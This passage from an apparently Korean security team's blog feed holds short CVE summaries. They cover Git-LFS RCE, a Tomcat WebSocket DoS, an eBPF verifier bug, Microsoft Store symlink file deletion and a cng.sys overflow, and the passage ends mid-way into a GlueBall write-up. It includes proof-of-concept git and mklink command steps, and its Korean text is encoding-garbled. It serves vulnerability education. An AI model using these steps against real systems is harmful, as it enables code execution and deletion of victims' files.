í”„ë¡œì„¸ìŠ¤ê°€ segmentation faultë¥¼ ì¼ìœ¼í‚¬ ë•Œ</li><li>ì¡´ì¬í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ì— attach í•  ë•Œ</li></ol><p>ì €ì—ê² ì´ ë‘ ê°€ì§€ ìƒí™© ëª¨ë‘ ë§¤ìš° í° ë‹¨ì ì…ë‹ˆë‹¤. python exploit ì½”ë“œì— ë”°ë¼ ë™ì‘í•˜ê³  ìˆëŠ” í”„ë¡œì„¸ìŠ¤ì— gdbë¥¼ attach í•´ ë¶„ì„í•˜ëŠ” ê²ƒì´ ì£¼ëœ ì‚¬ìš©ë°©ë²•ì¸ë°, ê·¸ê²Œ ì•ˆëœë‹¤ë‹ˆìš”â€¦ ê·¸ë¦¬ê³  segmentation faultì— ëŒ€í•œ ì–´ë– í•œ ì •ë³´ë„ ì–»ì„ ìˆ˜ ì—†ìœ¼ë‹ˆ ì·¨ì•½ì  ì°¾ëŠ” ì…ì¥ì—ì„  í™”ë”±ì§€ê°€ ì•ˆ ë‚  ìˆ˜ê°€ ì—†ìŠµë‹ˆë‹¤.</p><h1 id="ë§ˆë¬´ë¦¬"><a href="#ë§ˆë¬´ë¦¬" class="headerlink" title="ë§ˆë¬´ë¦¬"></a>ë§ˆë¬´ë¦¬</h1><ol><li>gdbì˜ ê¸°ëŠ¥ì„ guië¡œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤? <strong>No</strong><ul><li>ê²°êµ­ ëª¨ë“  ë™ì‘ì€ gdb terminalì„ í†µí•´ ì´ë£¨ì–´ì§.</li><li>guië¡œ gdbë¥¼ ë‹¤ë£¨ëŠ” ê²ƒì´ ì•„ë‹ˆë¼, gdbì˜ ê²°ê´ê°’ì„ guië¡œ ë³´ì—¬ì£¼ëŠ” í”ŒëŸ¬ê·¸ì¸</li><li>chromeìœ¼ë¡œ gdbë¥¼ ì‚¬ìš©í•˜ëŠ” ê±°ë¼ ì˜¤íˆë ¤ ë¶ˆí¸í•¨</li></ul></li><li>pwnableì— ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤? <strong>No</strong></li></ol>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>gdb-frontend</tag>
      
      <tag>pwndbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-27955: Git-LFS RCE Exploit</title>
    <link href="/2020/11/06/l0ch/2020-11-06/"/>
    <url>/2020/11/06/l0ch/2020-11-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html">Git-LFS RCE Exploit CVE-2020-27955</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git &lt;= 2.29.2-git-lfs</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ëŒ€ìš©ëŸ‰ íŒŒì¼ì„ ì—…ë¡œë“œ í•˜ê¸° ìœ„í•´ githubì—ì„œ ê°œë°œí•œ extensionì¸ git-lfs(Large File Storage)ì—ì„œ Windowsë¥¼ ëŒ€ìƒìœ¼ë¡œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ git-lfsë¡œ ì—…ë¡œë“œí•œ íŒŒì¼ì´ ìˆëŠ” ì €ì¥ì†Œì—ì„œ Windows ì‹œìŠ¤í…œì˜ í”¼í•´ìê°€ ì €ì¥ì†Œë¥¼ ë³µì œí•  ë•Œ ìƒí˜¸ì‘ìš© ì—†ì´ ê³µê²©ìì˜ ì•…ì„± ë°”ì´ë„ˆë¦¬ê°€ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì˜ PoCëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><p>ê³µê²©ìëŠ” ì €ì¥ì†Œì— ì‹¤í–‰í•  ëª…ë ¹ì–´ë¥¼ í¬í•¨í•œ <code>git.*</code> ì´ë¦„ì˜ windows ë°”ì´ë„ˆë¦¬ í˜•ì‹ íŒŒì¼ì„ ì¶”ê°€í•©ë‹ˆë‹¤.</p><pre><code class="hljs bash">git.bat : @<span class="hljs-built_in">echo</span> git-lfs RCE exploit!!git add git.bat</code></pre></li><li><p>ì €ì¥ì†Œì— lfs íŒŒì¼ì„ ì¶”ê°€í•©ë‹ˆë‹¤.</p><pre><code class="hljs bash">git lfs track <span class="hljs-string">&quot;* .dat&quot;</span> git add .gitattributes<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git exploit PoC&quot;</span>&gt; lfs.datgit add lfs.dat</code></pre></li><li><p>ë°”ì´ë„ˆë¦¬ì™€ lfs íŒŒì¼ì„ ì»¤ë°‹í•˜ê³  ì›ê²© ì €ì¥ì†Œì— ì—…ë¡œë“œí•©ë‹ˆë‹¤.</p><pre><code class="hljs bash">git commit -a -m <span class="hljs-string">&quot;git-lfs exploit&quot;</span>git remote add origin https://repository_urlgit push -u origin master</code></pre></li><li><p>Windows ì‹œìŠ¤í…œì—ì„œ cloneí•  ë•Œ git-lfs ì·¨ì•½ì ì´ íŠ¸ë¦¬ê±°ë˜ì–´ ê¸°ì¡´ git ë°”ì´ë„ˆë¦¬ ëŒ€ì‹  ê³µê²©ìì˜ ì›ê²© ì €ì¥ì†Œì—ì„œ cloneí•œ ì•…ì„± <code>git.bat</code>ì´ ì‚¬ìš©ì ìƒí˜¸ì‘ìš© ì—†ì´ ì‹¤í–‰ë©ë‹ˆë‹¤.</p><pre><code class="hljs bash">PowerShell&gt; git <span class="hljs-built_in">clone</span> https://repository_urlgit-lfs RCE exploit!!</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>git</tag>
      
      <tag>L0ch</tag>
      
      <tag>git lfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-13935: Apache Tomcat Websocket ì·¨ì•½ì </title>
    <link href="/2020/11/05/idioth/2020-11-05/"/>
    <url>/2020/11/05/idioth/2020-11-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/">DIVING INTO A WEBSOCKET VULNERABILITY IN APACHE TOMCAT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tomcat<ul><li>10.0.0-M1 ~ 10.0.0-M6</li><li>9.0.0.M1 ~ 9.0.36</li><li>8.5.0 ~ 8.5.56</li><li>7.0.27 ~ 7.0.104</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í•´ë‹¹ ì·¨ì•½ì ì€ Apache Tomcatì˜ WebSocket í”„ë ˆì„ì—ì„œ <code>payloadLength</code>ì— ì˜í•´ ë¬´í•œ ë£¨í”„ê°€ íŠ¸ë¦¬ê±° ë˜ì–´ DoS ê³µê²©ìœ¼ë¡œ ì—°ê²°ë  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p><a href="https://tools.ietf.org/html/rfc6455#section-5.2">RFC6455</a>ì˜ WebSocket í”„ë ˆì„ì—ì„œ payload length í•„ë“œê°€ 127(2ì§„ìˆ˜ 1111111)ì´ë©´ 64ë¹„íŠ¸ í™•ì¥ payload lengthë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ payload lengthëŠ” 64ë¹„íŠ¸ unsigned integerì´ì§€ë§Œ RFCì—ì„œëŠ” ìµœìƒìœ„ ë¹„íŠ¸ê°€ í•­ìƒ 0ì´ ë˜ë„ë¡ ìš”êµ¬í•©ë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ payload length í•„ë“œë¥¼ 127ë¡œ ì„¤ì •í•´ì¤€ í›„ ë‹¤ìŒ 8ë°”ì´íŠ¸ì˜ MSBë¥¼ 1ë¡œ ì„¤ì •í•´ì£¼ê¸°ë§Œ í•˜ë©´ DoS ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ê³¼ ê´€ë ¨ëœ íŒ¨ì¹˜ëŠ” <code>payloadLength</code>ê°€ ìŒìˆ˜ê°€ ë  ê²½ìš° exceptionì„ ë°œìƒì‹œí‚¤ë„ë¡ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs java"><span class="hljs-comment">// The most significant bit of those 8 bytes is required to be zero</span><span class="hljs-comment">// (see RFC 6455, section 5.2). If the most significant bit is set,</span><span class="hljs-comment">// the resulting payload length will be negative so test for that.</span><span class="hljs-keyword">if</span> (payloadLength &lt; <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> WsIOException(        <span class="hljs-keyword">new</span> CloseReason(            CloseCodes.PROTOCOL_ERROR,            sm.getString(<span class="hljs-string">&quot;wsFrame.payloadMsbInvalid&quot;</span>)        )    );&#125;</code></pre><p>í•´ë‹¹ ì·¨ì•½ì ì— ê´€í•œ PoC CodeëŠ” <a href="https://github.com/RedTeamPentesting/CVE-2020-13935">ì—¬ê¸°</a>ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>dos</tag>
      
      <tag>apache</tag>
      
      <tag>idioth</tag>
      
      <tag>tomcat</tag>
      
      <tag>websocket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-27194: eBPF verifier bug</title>
    <link href="/2020/11/04/fabu1ous/2020-11-04/"/>
    <url>/2020/11/04/fabu1ous/2020-11-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">Fuzzing for eBPF JIT bugs in the Linux kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Linux kernel</p><p>eBPF</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>eBPFëŠ” ëŸ°íƒ€ì„ ì¤‘ ì•ˆì „í•˜ê²Œ ì»¤ë„ ì½”ë“œë¥¼ ì‚½ì…í•˜ê¸° ìœ„í•´ Verifierì™€ BPF instructionì„ ì‚¬ìš©í•©ë‹ˆë‹¤. VerifierëŠ” ë ˆì§€ìŠ¤í„°ì˜ ê°’ì˜ ë³€í™”ì™€ ê·¸ ê°’ë“¤ì˜ í—ˆìš© ë²”ìœ„(ì´í•˜ range)ë“±ì„ íŠ¸ë˜í‚¹í•´  memory loadì™€ storeì˜ out-of-bound ì—¬ë¶€ë¥¼ ê²€ì‚¬í•˜ë©°,  32-bitì™€ 64-bit ê°ê°ì˜ rangeë¥¼ êµ¬ë¶„í•´ ê´€ë¦¬í•©ë‹ˆë‹¤. ORì—°ì‚°ì´ ëë‚œ í›„ ê·¸ì— ë§ê²Œ  32-bit ë ˆì§€ìŠ¤í„°ì˜ rangeë¥¼ ì—…ë°ì´íŠ¸í•˜ëŠ” <code>scalar32_min_max_or()</code>í•¨ìˆ˜ëŠ” ì´ êµ¬ë¶„ì´ í™•ì‹¤í•˜ì§€ ëª»í•˜ê³ , ë²„ê·¸ë¥¼ ìœ ë°œí•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-comment">/* ORing two positives gives a positive, so safe to</span><span class="hljs-comment">* cast result into s64.</span><span class="hljs-comment">*/</span>dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;</code></pre><p>64-bit rangeë¥¼ 32-bit rangeë¡œ casting í•˜ëŠ” <code>scalar32_min_max_or()</code>ì˜ ì½”ë“œ ë¶€ë¶„ì…ë‹ˆë‹¤. VerifierëŠ” <code>s32_min_value</code>ì™€ <code>s32_max_value</code>ë¥¼ ì´ìš©í•´ rangeë¥¼ íŠ¸ë˜í‚¹ í•˜ëŠ”ë°, ë§Œì•½ ì´ ë‘ ê°’ì´ ê°™ë‹¤ë©´ ë ˆì§€ìŠ¤í„° ê°’ì„ ìƒìˆ˜ë¡œ ì¸ì‹í•˜ê³  ê·¸ì— ë”°ë¼ ì½”ë“œê°€ ë¶„ê¸°í•©ë‹ˆë‹¤. </p><p>ë§Œì•½ ìœ„ ì½”ë“œì—ì„œ <code>dst_reg-&gt;umin_value</code>ê°€ 1ì´ê³ , <code>dst_reg-&gt;umax_value</code>ê°€ 25769803777ì´ë¼ë©´ <code>dst_reg-&gt;s32_min_value</code>ì™€ <code>dst_reg-&gt;s32_max_value</code> ë‘˜ ë‹¤ 1ë¡œ ì €ì¥ë˜ì–´ ë ˆì§€ìŠ¤í„°ë¥¼ rangeê°€ ì•„ë‹Œ ìƒìˆ˜ë¡œ ì¸ì‹í•˜ê²Œ ë©ë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf">https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>ebpf</tag>
      
      <tag>bpf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16877: Exploiting Microsoft Store Games</title>
    <link href="/2020/11/03/l0ch/11-03_1day1line/"/>
    <url>/2020/11/03/l0ch/11-03_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.ioactive.com/2020/11/cve-2020-16877-exploiting-microsoft.html">CVE-2020-16877: Exploiting Microsoft Store Games</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 - Microsoft Store</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Storeì—ì„œ ë°°í¬í•˜ëŠ” UWP(Universal Windows platform) ì•±ì€ ì¼ë°˜ì ìœ¼ë¡œ  <code>C:\Program Files\WindowsApps</code> ë””ë ‰í„°ë¦¬ì— ì €ì¥ë˜ì–´ ì¼ë°˜ì ì¸ ê¶Œí•œìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ì—†ìœ¼ë©° Appxë¼ëŠ” í˜•ì‹ì˜ íŒŒì¼ì„ ì•± ì„¤ì¹˜ ê´€ë¦¬ì í”„ë¡œê·¸ë¨ì„ í†µí•´ì„œë§Œ ì„¤ì¹˜/ì œê±°ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. </p><p>ì§€ë‚œ 6ì›” MicrosoftëŠ” ê²Œì„ ì•±ì˜ ëª¨ë“œë¥¼ ì§€ì›í•˜ê¸° ìœ„í•´ ìˆ˜ì •ì´ ê°€ëŠ¥í•œ Windows ì•±ì„ í˜¸ìŠ¤íŒ… í•˜ëŠ” ë””ë ‰í„°ë¦¬ì¸ <code>C:\ProgramFiles\ModifiableWindowsApps</code>ì„ ì¶”ê°€í–ˆëŠ”ë°, ì´ ê¸°ëŠ¥ì— ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì‚¬ìš©í•´ arbitrary file deletion ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>PoCëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>ë‹¤ë¥¸ ì‹œìŠ¤í…œ ë“œë¼ì´ë¸Œ <code>D:\</code>ì— pivot í•  ê²½ë¡œë¥¼ ìƒì„±í•˜ê³  windows ì €ì¥ì†Œ ì„¤ì •ì„ í†µí•´ ê¸°ë³¸ ì €ì¥ ìœ„ì¹˜ë¥¼ <code>D:\</code> ë¡œ ë³€ê²½í•©ë‹ˆë‹¤</li></ol><pre><code class="hljs powershell"><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\Program Files&quot;</span><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\pivot&quot;</span></code></pre><ol start="2"><li><p>Microsoft Storeì—ì„œ ëª¨ë“œ ì§€ì›ì´ ë˜ëŠ” ê²Œì„ ì•±ì„ ë°›ì•„ ì„¤ì¹˜í•˜ë©´ <code>D:\Program Files\ModifiableWindowsApps</code> í•˜ìœ„ì— í•´ë‹¹ ì•±ì˜ ë””ë ‰í„°ë¦¬ê°€ ìƒì„±ë©ë‹ˆë‹¤.</p></li><li><p>ì´ì¤‘ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ìƒì„±í•´ ì•±ì˜ ë””ë ‰í„°ë¦¬ê°€ ì‹¬ë³¼ë¦­ ë§í¬ì˜ êµì°¨ì ì´ ë˜ë„ë¡ ë§Œë“¤ê³ , ì‹¬ë³¼ë¦­ ë§í¬ë¡œ ë¦¬ë””ë ‰ì…˜ í•  ìµœì¢… ë””ë ‰í„°ë¦¬ëŠ” ì‚­ì œí•  ì‹œìŠ¤í…œ ê¶Œí•œì˜ ë””ë ‰í„°ë¦¬ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.</p></li></ol><pre><code class="hljs powershell">mklink / J <span class="hljs-string">&quot;D:\Program Files\ModifiableWindowsApps&quot;</span> <span class="hljs-string">&quot;D:\pivot&quot;</span>mklink / J <span class="hljs-string">&quot;D:\pivot\Game_App&quot;</span> <span class="hljs-string">&quot;C:\arbitrary_path\to_delete&quot;</span></code></pre><ol start="4"><li>ì•±ì„ ì‚­ì œí•˜ë©´ ì´ì¤‘ ì‹¬ë³¼ë¦­ ë§í¬ë¡œ ì¸í•´ ì‹œìŠ¤í…œ ê¶Œí•œìœ¼ë¡œ ì„ì˜ ê²½ë¡œì˜ íŒŒì¼ì´ ì‚­ì œë©ë‹ˆë‹¤.</li></ol><p>ì‘ì„±ìëŠ” ì‹œìŠ¤í…œ ê¶Œí•œì˜ ì‰˜ì„ ì‹¤í–‰í•˜ëŠ” ë°ëª¨ ì˜ìƒ ë˜í•œ ê³µê°œí–ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file deletion</tag>
      
      <tag>microsoft store</tag>
      
      <tag>symbolic link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-17087: Windows kernel cng.sys pool-based buffer overflow</title>
    <link href="/2020/11/02/idioth/2020-11-02/"/>
    <url>/2020/11/02/idioth/2020-11-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2104">Windows Kernel cng.sys pool-based buffer overflow in IOCTL 0x390400</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 1903(64-bit)</li><li>Maybe since at least Windows 7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ìœˆë„ìš° ì»¤ë„ ì•”í˜¸í™” ë“œë¼ì´ë²„ì¸ cng.sysì—ì„œ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ IOCTL 0x390400 ì²˜ë¦¬ ì¤‘ <code>cng!CfgAdtpFormatPropertyBlock</code> í•¨ìˆ˜ì—ì„œ 16-bit integer truncationì— ì˜í•´ ë°œìƒí–ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c">CONST USHORT DestinationSize = (USHORT)(<span class="hljs-number">6</span> * SourceLength);PWCHAR OutputBuffer = BCryptAlloc(DestinationSize);<span class="hljs-keyword">for</span> (USHORT i = <span class="hljs-number">0</span>; i &lt; SourceLength; i++) &#123;*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &gt;&gt; <span class="hljs-number">4</span>];*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &amp; <span class="hljs-number">0xF</span>];*OutputBuffer++ = <span class="hljs-string">&#x27; &#x27;</span>;SourceBuffer++;&#125;</code></pre><p><code>SourceLength</code>ì˜ ê°’ì´ <code>0x2AAB</code>ë³´ë‹¤ í¬ê±°ë‚˜ ê°™ìœ¼ë©´ NonPagedPoolì— ë¹„ì •ìƒì ìœ¼ë¡œ ì‘ì€ ë²„í¼ê°€ í• ë‹¹ë˜ê³  binary-to-hex ë³€í™˜ ë£¨í”„ì— ì˜í•´ ì˜¤ë²„ í”Œë¡œìš°ê°€ ë°œìƒí•©ë‹ˆë‹¤. ìœˆë„ìš° 10 1903ì—ì„œ í…ŒìŠ¤íŠ¸ë˜ì—ˆì§€ë§Œ ìœˆë„ìš° 7ë¶€í„° ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” ê²ƒìœ¼ë¡œ ì˜ˆìƒë˜ë©° í˜„ì¬ ì·¨ì•½ì ì´ ì•…ìš©ë˜ê³  ìˆë‹¤ê³  í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>integer overflow</tag>
      
      <tag>idioth</tag>
      
      <tag>ioctl</tag>
      
      <tag>cng.sys</tag>
      
      <tag>buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] CVE-2020-1464: GlueBall</title>
    <link href="/2020/11/01/l0ch/cve-2020-1464/"/>
    <url>/2020/11/01/l0ch/cve-2020-1464/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš”! ê¸€ ì“°ëŠ” ê±¸ ë¯¸ë£¨ê³  ë¯¸ë£¨ë‹¤ idioth íŒ€ì¥ë‹˜ì˜ êµ¬ë°•ì— ê²¨ìš°ê²¨ìš° ì²« ê¸€ì„ ì“°ëŠ” L0chì…ë‹ˆë‹¤. </p><p><del>ì•…ë• ìƒì‚¬ ìš°ìš° ê¸¸ ê°€ë‹¤ ë ˆê³  ë¸”ë¡ì´ë‚˜ ë°Ÿì•„ë¼</del> </p><p>ì˜¤ëŠ˜ì€ Windowsì˜ ì·¨ì•½ì  í•˜ë‚˜ë¥¼ ë“¤ê³  ì™”ëŠ”ë°ìš”, í•¨ê»˜ ë³´ì‹¤ê¹Œìš”? </p><h1 id="ê°œìš”"><a href="#ê°œìš”" class="headerlink" title="ê°œìš”"></a>ê°œìš”</h1><p>GlueBallì´ë¼ê³  ë¶ˆë¦¬ëŠ” CVE-2020-1464ëŠ” 2018ë…„ 9ì›”ì— ì œë³´ë˜ì—ˆìŠµë‹ˆë‹¤. ê·¼ë° ë§ˆì†Œ ì¹œêµ¬ë“¤ì´ íŒ¨ì¹˜ ì•ˆ í•˜ê³  ìˆë‹¤ê°€ 2ë…„ì´ ì§€ë‚œ ìµœê·¼ patch tuesdayë¼ê³  ë¶ˆë¦¬ëŠ” ì •ê¸° íŒ¨ì¹˜ì—ì„œ íŒ¨ì¹˜ê°€ ë˜ì—ˆâ€¦? ì™œ ì§€ê¸ˆ ì™€ì„œ???</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img1.png"></p><p>ì´ìƒí•˜ê¸´ í•˜ì§€ë§Œâ€¦ ë„˜ì–´ê°€ë„ë¡ í•˜ê³  ì·¨ì•½ì ì„ ì´í•´í•˜ëŠ”ë° í•„ìš”í•œ ë°°ê²½ ì§€ì‹ë¶€í„° ì•Œì•„ë³´ë„ë¡ í•©ì‹œë‹¤!</p><h1 id="MSI-Microsoft-Installer"><a href="#MSI-Microsoft-Installer" class="headerlink" title="MSI (Microsoft Installer)"></a>MSI (Microsoft Installer)</h1><p>Windows ì„¤ì¹˜ íŒ¨í‚¤ì§€<br>â†’ Windowsìš© ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì„¤ì¹˜ ë° ì—…ë°ì´íŠ¸ë¥¼ ë°°í¬í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img2.png"></p><p>ì˜¤ëŠ˜ì˜ í¬ìƒì–‘(ã…ã…)ì´ ë  ìš°ë¦¬ í¬ë¡¬ ì–´ì„œ ì˜¤ê³ .<br>í¬ë¡¬ë„ MSIë¡œ ë°°í¬ë˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. malicious í•˜ê²Œ ê¾¸ë©°ì¤„ í…Œë‹ˆ ì¡°ê¸ˆë§Œ ê¸°ë‹¤ë¦¬ë¼êµ¬~</p><h1 id="Code-Signing-Certificate-ì½”ë“œ-ì„œëª…-ì¸ì¦ì„œ"><a href="#Code-Signing-Certificate-ì½”ë“œ-ì„œëª…-ì¸ì¦ì„œ" class="headerlink" title="Code Signing Certificate(ì½”ë“œ ì„œëª… ì¸ì¦ì„œ)"></a>Code Signing Certificate(ì½”ë“œ ì„œëª… ì¸ì¦ì„œ)</h1><blockquote><p><strong>Code Signing Certificate</strong><br>MSê°€ ë„ì…í•œ ì‹¤í–‰íŒŒì¼ê³¼ ìŠ¤í¬ë¦½íŠ¸ì˜ ë””ì§€í„¸ ì„œëª… ê³¼ì •ìœ¼ë¡œ, ì´ëŸ¬í•œ ì¸ì¦ì„œëŠ” íŒŒì¼ì´ ì•ˆì „í•œ íŒŒì¼ì„ì„ ì¦ëª…í•´ì¤€ë‹¤. SmartScreen filterëŠ” ì¸ì¦ì„œì— ëŒ€í•œ ìì²´ì ì¸ white list DBë¥¼ ê´€ë¦¬í•´ í•´ë‹¹ ì¸ì¦ì„œê°€ ì•ˆì „í•œì§€ ì•„ë‹Œì§€<br>íŒë‹¨í•œë‹¤. ì¸ì¦ì„œê°€ ì¡´ì¬í•˜ì§€ ì•Šê±°ë‚˜ íŒŒì¼ì´ ë³€ì¡°ë˜ì–´ ì¸ì¦ì„œê°€ ìœ íš¨í•˜ì§€ ì•Šìœ¼ë©´ ì‹¤í–‰í•  ë•Œ ê²½ê³ ë¥¼ ë„ì›Œ<br>ì‚¬ìš©ìì—ê²Œ ì•Œë¦°ë‹¤.</p></blockquote><p><img src="/2020/11/01/l0ch/cve-2020-1464/img3.png"></p><p>ì½”ë“œ ì„œëª… ì¸ì¦ì„œê°€ ë„ì…ë˜ë©´ì„œ, ì¸ì¦ì„œê°€ í™•ì¸ë˜ì§€ ì•Šì€ íŒŒì¼ì˜ ë¬´ë¶„ë³„í•œ ì‹¤í–‰ì´ ì¤„ì—ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì—¬ê¸°ì„œ ëë‚˜ë©´ ì„­ì„­í•˜ì£ ? ìœ íš¨í•˜ì§€ ì•Šì€ ì¸ì¦ì„œì„ì—ë„ ì¸ì¦ì„œ ê²€ì¦ì„ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆëŠ”ë° ì´ê²ƒì´ ì˜¤ëŠ˜ ì„¤ëª…í•  GlueBallì…ë‹ˆë‹¤.</p><h1 id="GlueBall-CVE-2020-1464"><a href="#GlueBall-CVE-2020-1464" class="headerlink" title="GlueBall : CVE-2020-1464"></a>GlueBall : CVE-2020-1464</h1><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>ì·¨ì•½ì ì€ MSI íŒŒì¼ì˜ ì¸ì¦ì„œ ê²€ì¦ ê³¼ì •ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. </p><p>MSI íŒŒì¼ì„ ì‹¤í–‰í•˜ë©´ <code>msisip.dll</code>ì˜ <code>MsiSIPVerifyIndirectData()</code> í•¨ìˆ˜ì—ì„œ íŒŒì¼ì˜ ì‹œì‘ ë¶€ë¶„ì´ ìœ íš¨í•œ MSI íŒŒì¼ì¸ì§€ ê²€ì¦í•˜ê³  ì„œëª…ì„ í™•ì¸í•©ë‹ˆë‹¤.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img4.png"></p><p>ê·¸ëŸ°ë° ì´ë•Œ íŒŒì¼ì˜ ì‚¬ì´ì¦ˆë¥¼ ê²€ì¦í•˜ì§€ ì•Šì•„ MSI íŒŒì¼ì˜ ë’¤ì— ì„ì˜ì˜ ë°ì´í„°ê°€ ì¶”ê°€ë˜ì–´ë„ ìœ íš¨í•œ 